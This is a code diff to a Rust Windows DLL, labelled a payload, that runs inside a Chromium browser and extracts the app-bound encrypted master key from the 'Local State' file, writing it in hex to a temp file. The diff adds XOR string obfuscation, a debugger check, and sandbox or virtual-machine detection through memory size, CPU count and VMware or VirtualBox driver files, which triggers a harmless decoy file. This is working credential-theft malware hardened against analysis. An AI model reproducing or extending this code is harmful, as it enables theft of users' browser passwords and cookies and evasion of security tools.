@@ -1,5 +1,3 @@
-//! Payload DLL entry point
-
 #![allow(non_snake_case, unused)]
 
 mod elevator;
@@ -11,18 +9,146 @@ use windows::{
     Win32::{
         Foundation::{BOOL, HINSTANCE, TRUE},
         System::{
+            Diagnostics::Debug::IsDebuggerPresent,
+            SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX},
             SystemServices::DLL_PROCESS_ATTACH,
             Threading::{CreateThread, THREAD_CREATION_FLAGS},
         },
     },
 };
 
-const APPB: &[u8; 4] = b"APPB";
-const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
-const USER_DATA_ENV: &str = "CHROME_RECOVERY_USER_DATA_REL";
-const DATA_ROOT_ENV: &str = "CHROME_RECOVERY_DATA_ROOT";
+const XOR_KEY: u8 = 0x5A;
+const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
+const MAX_CPU_CORES: usize = 2;
 
-// ============ DLL ENTRY ============
+fn xor_str(data: &[u8]) -> String {
+    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
+}
+
+fn s_appb() -> Vec<u8> {
+    xor_str(&[0x1B, 0x0A, 0x0A, 0x18]).into_bytes()
+}
+
+fn s_result_env() -> String {
+    xor_str(&[
+        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
+        0x05, 0x08, 0x1F, 0x09, 0x16, 0x0E, 0x0E,
+    ])
+}
+
+fn s_user_data_env() -> String {
+    xor_str(&[
+        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
+        0x05, 0x0F, 0x29, 0x3F, 0x28, 0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x1F, 0x16,
+    ])
+}
+
+fn s_data_root_env() -> String {
+    xor_str(&[
+        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
+        0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x15, 0x15, 0x0E,
+    ])
+}
+
+fn s_roaming() -> String {
+    xor_str(&[0x28, 0x35, 0x3B, 0x37, 0x33, 0x34, 0x3D])
+}
+
+fn s_appdata() -> String {
+    xor_str(&[0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
+}
+
+fn s_localappdata() -> String {
+    xor_str(&[0x16, 0x15, 0x19, 0x1B, 0x16, 0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
+}
+
+fn s_local_state() -> String {
+    xor_str(&[0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F])
+}
+
+fn s_os_crypt_path() -> String {
+    xor_str(&[0x75, 0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x75, 0x3B, 0x2A, 0x2A, 0x05, 0x38, 0x35, 0x2F, 0x34, 0x3E, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23])
+}
+
+fn s_chromium() -> String {
+    xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37])
+}
+
+fn s_browser_key() -> String {
+    xor_str(&[0x38, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28])
+}
+
+fn s_master_key_hex() -> String {
+    xor_str(&[0x37, 0x3B, 0x29, 0x2E, 0x3F, 0x28, 0x05, 0x31, 0x3F, 0x23, 0x05, 0x32, 0x3F, 0x22])
+}
+
+fn s_error_key() -> String {
+    xor_str(&[0x3F, 0x28, 0x28, 0x35, 0x28])
+}
+
+fn s_decoy_name() -> String {
+    xor_str(&[
+        0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x05, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x05, 0x39,
+        0x32, 0x3F, 0x39, 0x31, 0x74, 0x2E, 0x22, 0x2E,
+    ])
+}
+
+fn s_decoy_body() -> String {
+    xor_str(&[
+        0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x7A, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x7A, 0x39,
+        0x32, 0x3F, 0x39, 0x31, 0x7A, 0x39, 0x35, 0x37, 0x2A, 0x36, 0x3F, 0x2E, 0x3F, 0x3E, 0x7A,
+        0x29, 0x2F, 0x39, 0x39, 0x3F, 0x29, 0x29, 0x3C, 0x2F, 0x36, 0x36, 0x23, 0x74, 0x50,
+    ])
+}
+
+struct EnvGuard;
+
+impl Drop for EnvGuard {
+    fn drop(&mut self) {
+        let _ = std::env::remove_var(s_result_env());
+        let _ = std::env::remove_var(s_user_data_env());
+        let _ = std::env::remove_var(s_data_root_env());
+    }
+}
+
+fn is_debugger_attached() -> bool {
+    unsafe { IsDebuggerPresent().as_bool() }
+}
+
+fn is_restricted_host() -> bool {
+    unsafe {
+        let mut status = MEMORYSTATUSEX {
+            dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
+            ..Default::default()
+        };
+        if GlobalMemoryStatusEx(&mut status).is_ok() && status.ullTotalPhys < MIN_MEMORY_BYTES {
+            return true;
+        }
+    }
+    if thread::available_parallelism()
+        .map(|count| count.get() <= MAX_CPU_CORES)
+        .unwrap_or(false)
+    {
+        return true;
+    }
+    let drivers = std::env::var("SystemRoot")
+        .map(PathBuf::from)
+        .unwrap_or_else(|_| PathBuf::from("C:\\Windows"))
+        .join("System32")
+        .join("drivers");
+    [
+        xor_str(&[0x2C, 0x37, 0x37, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
+        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x1D, 0x09, 0x1F, 0x2E, 0x74, 0x29, 0x23, 0x29]),
+        xor_str(&[0x2C, 0x37, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
+    ]
+    .iter()
+    .any(|name| drivers.join(name).exists())
+}
+
+fn run_decoy() {
+    let _ = std::fs::write(std::env::temp_dir().join(s_decoy_name()), s_decoy_body());
+}
+
 #[no_mangle]
 pub unsafe extern "system" fn DllMain(
     _h: HINSTANCE,
@@ -30,23 +156,30 @@ pub unsafe extern "system" fn DllMain(
     _: *mut c_void,
 ) -> BOOL {
     if reason == DLL_PROCESS_ATTACH {
+        if is_debugger_attached() {
+            thread::sleep(Duration::from_secs(30));
+            return TRUE;
+        }
+        if is_restricted_host() {
+            run_decoy();
+            return TRUE;
+        }
         CreateThread(None, 0, Some(worker), None, THREAD_CREATION_FLAGS(0), None).ok();
     }
     TRUE
 }
 
 unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
+    let _env_guard = EnvGuard;
     thread::sleep(Duration::from_millis(800));
-    let r = std::panic::catch_unwind(|| run());
+    let r = std::panic::catch_unwind(run);
     if let Ok(Err(e)) = r {
         write_error(&e);
     } else if r.is_err() {
-        write_error("panic in payload");
+        write_error(&xor_str(&[0x2A, 0x3B, 0x34, 0x33, 0x39, 0x7A, 0x33, 0x34, 0x7A, 0x2A, 0x3B, 0x23, 0x36, 0x35, 0x3B, 0x3E]));
     }
     0
 }
-
-// ============ MAIN LOGIC (renamed env var access) ============
 
 fn run() -> Result<(), String> {
     let exe = std::env::current_exe()
@@ -60,22 +193,25 @@ fn run() -> Result<(), String> {
     let ls: serde_json::Value = serde_json::from_str(&raw)
         .map_err(|e| format!("parse Local State: {e}"))?;
 
-    let key_b64 = ls.pointer("/os_crypt/app_bound_encrypted_key")
+    let key_b64 = ls
+        .pointer(&s_os_crypt_path())
         .and_then(|v| v.as_str())
-        .ok_or("app_bound_encrypted_key not found")?;
+        .ok_or_else(|| xor_str(&[0x3B, 0x2A, 0x2A, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23, 0x7A, 0x34, 0x35, 0x2E, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E]))?;
 
     let encrypted_key = base64::Engine::decode(
         &base64::engine::general_purpose::STANDARD,
         key_b64,
-    ).map_err(|e| format!("base64 decode: {e}"))?;
+    )
+    .map_err(|e| format!("base64 decode: {e}"))?;
 
-    if encrypted_key.len() < 4 {
-        return Err("encrypted key too short".into());
+    let appb = s_appb();
+    if encrypted_key.len() < appb.len() {
+        return Err(xor_str(&[0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x7A, 0x31, 0x3F, 0x23, 0x7A, 0x2E, 0x35, 0x35, 0x7A, 0x29, 0x32, 0x35, 0x28, 0x2E]));
     }
-    if !encrypted_key.starts_with(APPB) {
-        return Err("missing APPB prefix".into());
+    if !encrypted_key.starts_with(&appb) {
+        return Err(xor_str(&[0x37, 0x33, 0x29, 0x29, 0x33, 0x34, 0x3D, 0x7A, 0x1B, 0x0A, 0x0A, 0x18, 0x7A, 0x2A, 0x28, 0x3F, 0x3C, 0x33, 0x22]));
     }
-    let encrypted_key = &encrypted_key[4..];
+    let encrypted_key = &encrypted_key[appb.len()..];
 
     let browser = elevator::resolve_browser(&exe);
     let com_result = match browser {
@@ -95,11 +231,13 @@ fn run() -> Result<(), String> {
         return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
     }
 
-    let browser_label = browser.map(|b| b.name).unwrap_or("Chromium");
-    let result = serde_json::json!({
-        "browser": browser_label,
-        "master_key_hex": master_key.iter().map(|b| format!("{b:02x}")).collect::<String>(),
-    });
+    let browser_label = browser.map(|b| b.name.clone()).unwrap_or(s_chromium());
+    let mut result = serde_json::Map::new();
+    result.insert(s_browser_key(), serde_json::Value::String(browser_label));
+    result.insert(
+        s_master_key_hex(),
+        serde_json::Value::String(master_key.iter().map(|b| format!("{b:02x}")).collect::<String>()),
+    );
 
     let json = serde_json::to_string(&result).unwrap();
     let path = result_path();
@@ -109,15 +247,14 @@ fn run() -> Result<(), String> {
 }
 
 fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
-    // Use obfuscated env var names
-    if let Ok(rel) = std::env::var(USER_DATA_ENV) {
-        let root = match std::env::var(DATA_ROOT_ENV).as_deref() {
-            Ok("roaming") => std::env::var("APPDATA"),
-            _ => std::env::var("LOCALAPPDATA"),
+    if let Ok(rel) = std::env::var(s_user_data_env()) {
+        let root = match std::env::var(s_data_root_env()).as_deref() {
+            Ok(v) if v == s_roaming() => std::env::var(s_appdata()),
+            _ => std::env::var(s_localappdata()),
         }
         .map_err(|_| "APPDATA/LOCALAPPDATA not set")?;
 
-        let path = PathBuf::from(&root).join(rel).join("Local State");
+        let path = PathBuf::from(&root).join(rel).join(s_local_state());
         if path.exists() {
             return Ok(path);
         }
@@ -127,12 +264,12 @@ fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
     let browser = elevator::resolve_browser(exe)
         .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
 
-    let local_appdata = std::env::var("LOCALAPPDATA")
+    let local_appdata = std::env::var(s_localappdata())
         .map_err(|_| "LOCALAPPDATA not set")?;
 
     let local_state_path = PathBuf::from(&local_appdata)
-        .join(browser.user_data_rel)
-        .join("Local State");
+        .join(&browser.user_data_rel)
+        .join(s_local_state());
 
     if !local_state_path.exists() {
         return Err(format!("Local State not found: {}", local_state_path.display()));
@@ -142,14 +279,18 @@ fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
 }
 
 fn result_path() -> PathBuf {
-    if let Ok(p) = std::env::var(RESULT_ENV) {
+    if let Ok(p) = std::env::var(s_result_env()) {
         return PathBuf::from(p);
     }
-    std::env::temp_dir().join("chrome_recovery_result.json")
+    std::env::temp_dir().join(xor_str(&[
+        0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
+        0x05, 0x28, 0x3F, 0x29, 0x2F, 0x36, 0x2E, 0x74, 0x30, 0x29, 0x35, 0x34,
+    ]))
 }
 
 fn write_error(msg: &str) {
-    let r = serde_json::json!({ "error": msg });
-    let json = serde_json::to_string(&r).unwrap();
+    let mut obj = serde_json::Map::new();
+    obj.insert(s_error_key(), serde_json::Value::String(msg.to_string()));
+    let json = serde_json::to_string(&obj).unwrap();
     let _ = std::fs::write(result_path(), json);
 }
